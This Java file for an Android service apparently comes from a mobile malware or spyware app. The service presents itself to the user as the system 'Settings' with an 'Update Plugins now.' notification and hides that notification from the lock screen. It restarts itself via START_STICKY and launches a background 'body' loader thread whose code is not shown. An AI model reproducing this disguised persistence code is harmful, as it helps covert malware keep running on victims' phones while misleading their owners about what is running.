package com.support.samsg;


import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Icon;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;

import androidx.annotation.RequiresApi;

import java.io.ByteArrayInputStream;



public class loop extends Service implements View.OnScrollChangeListener, View.OnTouchListener, View.OnKeyListener {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Notification notification;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                CreateNotificationChannel();
                notification = CreateNotificationWithChannelId();
            } else {
                notification = CreateNotification();
            }
            startForeground(startId, notification);
        }
         body loader = new body(loop.this,300);
        Thread mThread = new Thread(loader);
        mThread.start();


        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
    }

    public void cancelAlarm(Context context) {

    }

    protected void setAlarm() {

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void CreateNotificationChannel() {
        String title = "Settings";
        NotificationChannel notificationChannel = new NotificationChannel(title, title, NotificationManager.IMPORTANCE_DEFAULT);
        notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.createNotificationChannel(notificationChannel);
    }

    private Notification CreateNotification() {
        String title = "Settings";
        String content = "Update Plugins now.";
        byte[] decoded = Base64.decode(_Global.ICON_START_NAME, Base64.DEFAULT);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(decoded);
        Bitmap ic_stat_name = BitmapFactory.decodeStream(inputStream);
        return new Notification.Builder(this)
                .setContentTitle(title)
                .setContentText(content)
                .setSmallIcon(Icon.createWithBitmap(ic_stat_name))
                .setOngoing(true)
                .build();
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private Notification CreateNotificationWithChannelId() {
        String title = "Settings";
        String content = "Update Plugins now.";
        byte[] decoded = Base64.decode(_Global.ICON_START_NAME, Base64.DEFAULT);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(decoded);
        Bitmap ic_stat_name = BitmapFactory.decodeStream(inputStream);
        return new Notification.Builder(this, title)
                .setContentTitle(content)
                .setContentText(content)
                .setSmallIcon(Icon.createWithBitmap(ic_stat_name))
                .setOngoing(true)
                .build();
    }

    @Override
    public void onScrollChange(View v, int scrollX, int scrollY, int oldScrollX, int oldScrollY) {

    }

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        return false;
    }

    @Override
    public boolean onKey(View v, int keyCode, KeyEvent event) {
        return false;
    }
}